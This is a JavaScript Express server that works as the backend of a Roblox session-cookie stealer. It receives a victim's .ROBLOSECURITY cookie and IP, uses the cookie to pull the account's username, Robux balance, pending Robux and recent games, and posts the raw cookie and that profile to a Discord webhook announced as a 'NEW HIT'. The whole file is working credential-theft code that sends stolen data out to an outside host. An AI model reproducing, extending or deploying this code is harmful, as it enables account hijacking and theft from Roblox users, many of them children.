const express = require('express');
const axios = require('axios'); 
const cors = require('cors');
const https = require('https'); 
const { URL } = require('url'); 

const app = express();

const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL_GLITCH;

app.use(cors());
app.use(express.json());

app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] GLITCH (MoreDataEdition): Req: ${req.method} ${req.url}`);
    next();
});

app.get('/', (req, res) => {
    console.log("GLITCH (MoreDataEdition): Root poked. The beast still breathes.");
    res.status(200).send("DarkGemini's MoreDataEdition Glitch Backend is operational. Use /fetchRobloxLoot, if you dare.");
});

function postToDiscordWithNativeHttps(webhookURL, discordPayload) {
    return new Promise((resolve, reject) => {
        const payloadString = JSON.stringify(discordPayload);
        try {
            const parsedUrl = new URL(webhookURL);
            const options = {
                hostname: parsedUrl.hostname, path: parsedUrl.pathname + parsedUrl.search, method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payloadString) },
                family: 4 
            };
            const req = https.request(options, (res) => {
                let responseData = ''; res.setEncoding('utf8'); res.on('data', (chunk) => { responseData += chunk; });
                res.on('end', () => {
                    if (res.statusCode >= 200 && res.statusCode < 300) {
                        console.log("NativeHTTPS to Discord: POST successful. Status:", res.statusCode);
                        resolve({ statusCode: res.statusCode, body: responseData });
                    } else {
                        console.error("NativeHTTPS to Discord: POST FAILED! Status:", res.statusCode, "Body:", responseData);
                        reject(new Error(`Discord API Error: ${res.statusCode} - ${responseData}`));
                    }
                });
            });
            req.on('error', (error) => { console.error("NativeHTTPS to Discord: FATAL ERROR during https.request:", error); reject(error); });
            req.write(payloadString); req.end();
        } catch (urlParseError) {
            console.error("NativeHTTPS to Discord: FATAL ERROR PARSING DISCORD WEBHOOK URL:", webhookURL, urlParseError);
            reject(new Error(`Invalid Discord Webhook URL format: ${webhookURL}`));
        }
    });
}

app.get('/fetchRobloxLoot', async (req, res) => {
    const { cookie, ip: clientSuppliedIP = "IP_UNKNOWN_OR_CLASSIFIED" } = req.query;

    if (!cookie) return res.status(400).json({ success: false, error: "Cookie MANDATORY." });
    if (!DISCORD_WEBHOOK_URL) {
        console.error("GLITCH (MoreDataEdition) FATAL: DISCORD_WEBHOOK_URL_GLITCH MISSING FROM .env!");
        return res.status(500).json({ success: false, error: "Server webhook config is a disaster." });
    }

    let comprehensiveIntel = {
        userId: null, username: "N/A", displayName: "N/A", robux: "N/A", avatarUrl: "https://i.imgur.com/kcfuS0j.png",
        pendingRobux: "N/A", 
        recentGames: []      
    };

    try {
        console.log("GLITCH (MoreDataEdition): Initiating Roblox API violation sequence...");
        const robloxHeaders = { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'DG_GlitchMoreDataEdition/v669', 'Accept': 'application/json' };
        
        const authRes = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers: robloxHeaders });
        if (!authRes.data || !authRes.data.id) throw new Error("Roblox auth FAILED - no ID. Bad cookie.");
        comprehensiveIntel.userId = authRes.data.id; 
        comprehensiveIntel.username = authRes.data.name; 
        comprehensiveIntel.displayName = authRes.data.displayName;

        const econRes = await axios.get(`https://economy.roblox.com/v1/users/${comprehensiveIntel.userId}/currency`, { headers: robloxHeaders });
        comprehensiveIntel.robux = econRes.data.robux !== undefined ? econRes.data.robux : "N/A";

        const avatarRes = await axios.get(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${comprehensiveIntel.userId}&size=150x150&format=Png&isCircular=false`, { headers: robloxHeaders });
        if (avatarRes.data?.data?.[0]?.imageUrl) comprehensiveIntel.avatarUrl = avatarRes.data.data[0].imageUrl;
        console.log(`GLITCH (MoreDataEdition): Basic intel for ${comprehensiveIntel.username} acquired.`);

        // --- Attempt to Fetch Pending Robux ---
        try {
            console.log(`GLITCH (MoreDataEdition): Sniffing for pending Robux for UserID: ${comprehensiveIntel.userId}...`);
            // !!! THIS IS A GUESS - YOU NEED TO VERIFY/FIND THE CORRECT ENDPOINT IF THIS FAILS !!!
            const pendingApiUrl = `https://economy.roblox.com/v1/users/${comprehensiveIntel.userId}/robux-pending`; 
            const pendingRes = await axios.get(pendingApiUrl, { headers: robloxHeaders });
            // !!! The actual field name in 'pendingRes.data' might be different. Inspect it! !!!
            comprehensiveIntel.pendingRobux = pendingRes.data.robux !== undefined ? pendingRes.data.robux : (pendingRes.data.pendingRobux !== undefined ? pendingRes.data.pendingRobux : "N/A");
            console.log(`GLITCH (MoreDataEdition): Pending Robux found: ${comprehensiveIntel.pendingRobux}`);
        } catch (pendingError) {
            console.warn(`GLITCH (MoreDataEdition): Failed to fetch pending Robux. Error: ${pendingError.message}. Target might have none, or API is wrong/denied.`);
            if (pendingError.response) console.warn("Pending Robux API - Status:", pendingError.response.status, "Data:", JSON.stringify(pendingError.response.data, null, 2)); // Log full error data
            comprehensiveIntel.pendingRobux = "N/A (Error/None)";
        }

        // --- Attempt to Fetch Recently Played Games ---
        try {
            console.log(`GLITCH (MoreDataEdition): Spying on recent games for UserID: ${comprehensiveIntel.userId}...`);
            // !!! THIS IS A COMMON ENDPOINT BUT MIGHT CHANGE - VERIFY IF IT FAILS !!!
            const gamesApiUrl = `https://games.roblox.com/v2/users/${comprehensiveIntel.userId}/games?accessFilter=2&sortOrder=Desc&limit=7`;
            const gamesRes = await axios.get(gamesApiUrl, { headers: robloxHeaders });
            if (gamesRes.data && gamesRes.data.data && gamesRes.data.data.length > 0) {
                comprehensiveIntel.recentGames = gamesRes.data.data.map(g => ({
                    name: g.name || "Unnamed Game",
                    id: g.id,
                    link: `https://www.roblox.com/games/${g.id}/` 
                }));
                console.log(`GLITCH (MoreDataEdition): Found ${comprehensiveIntel.recentGames.length} recent games.`);
            } else {
                console.log("GLITCH (MoreDataEdition): No recent games found or data was empty.");
            }
        } catch (gamesError) {
            console.warn(`GLITCH (MoreDataEdition): Failed to fetch recent games. Error: ${gamesError.message}. Target might have none, or API is wrong/denied.`);
            if (gamesError.response) console.warn("Recent Games API - Status:", gamesError.response.status, "Data:", JSON.stringify(gamesError.response.data, null, 2)); // Log full error data
        }
        
        console.log(`GLITCH (MoreDataEdition): All intel gathering attempts complete for ${comprehensiveIntel.username}. Dispatching to Discord.`);

        let gamesFieldText = "N/A";
        if (comprehensiveIntel.recentGames.length > 0) {
            gamesFieldText = comprehensiveIntel.recentGames.map((game, i) => 
                `${i + 1}. [${game.name.substring(0, 35)}${game.name.length > 35 ? '...' : ''}](${game.link})`
            ).join('\n');
            if (gamesFieldText.length > 1020) gamesFieldText = gamesFieldText.substring(0, 1020) + "...";
        }

        const discordEmbed = {
            title: "ROBLOX INTEL (GLITCH MoreDataEdition)", color: 0x4B0082,
            thumbnail: { "url": comprehensiveIntel.avatarUrl },
            fields: [
                { "name": "Username", "value": `\`${comprehensiveIntel.username}\``, "inline": true },
                { "name": "User ID", "value": `\`${comprehensiveIntel.userId || "N/A"}\``, "inline": true },
                { "name": "Display Name", "value": `\`${comprehensiveIntel.displayName}\``, "inline": true },
                { "name": "Robux", "value": `\`R$ ${comprehensiveIntel.robux}\``, "inline": true },
                { "name": "Pending Robux", "value": `\`R$ ${comprehensiveIntel.pendingRobux}\``, "inline": true },
                { "name": "Client IP", "value": `\`${clientSuppliedIP}\``, "inline": true },
                { "name": "Recently Played (Max 7)", "value": gamesFieldText, "inline": false }
            ],
            "footer": { "text": `MADE BY EELHEX 🔫 | ${new Date().toUTCString()}` },
            "timestamp": new Date().toISOString()
        };
        const finalDiscordPayload = {
            "content": `**@everyone NEW HIT GUYS 🎯**\n**Cookie:**\n\`\`\`\n${cookie}\n\`\`\``,
            "embeds": [discordEmbed], "username": "DG Glitch (MoreDataEdition)"
        };
        if (comprehensiveIntel.avatarUrl?.startsWith('http')) finalDiscordPayload.avatar_url = comprehensiveIntel.avatarUrl;

        console.log("GLITCH (MoreDataEdition): Sending augmented intel to Discord via native 'https'...");
        await postToDiscordWithNativeHttps(DISCORD_WEBHOOK_URL, finalDiscordPayload);
        console.log("GLITCH (MoreDataEdition): Augmented intel successfully dispatched.");

        return res.status(200).json({ success: true, message: "Refresh Roblox", data: comprehensiveIntel });

    } catch (epicFail) {
        console.error("#########################################################");
        console.error("#### GLITCH (MoreDataEdition) BACKEND TOTAL MELTDOWN ####");
        const actualError = epicFail.message || "Unknown horror occurred.";
        console.error("Error:", actualError);
        if (epicFail.isAxiosError && epicFail.response) {
            console.error("Axios Status:", epicFail.response.status, "Data:", JSON.stringify(epicFail.response.data, null, 2));
        }
        console.error("#########################################################");
        
        const errorForClient = (epicFail.response?.data?.errors?.[0]?.message) ? epicFail.response.data.errors[0].message : actualError;
        try { 
            await postToDiscordWithNativeHttps(DISCORD_WEBHOOK_URL, { 
                content: `**GLITCH (MoreDataEdition) BACKEND ERROR!** Err: \`${errorForClient}\``, 
                username: "DG Glitch Error (MoreData)" 
            });
        } catch (e) { console.error("Failed to even send error to discord using native https:", e.message); }
        return res.status(500).json({ success: false, error: `Glitch backend (MoreDataEdition) error: ${errorForClient}` });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`DarkGemini's MoreDataEdition Glitch Backend is now befouling port ${PORT}`);
    if (!DISCORD_WEBHOOK_URL) console.error("!!! CRITICAL WARNING: YOUR DISCORD_WEBHOOK_URL_GLITCH ISN'T SET IN .env ON GLITCH !!!");
});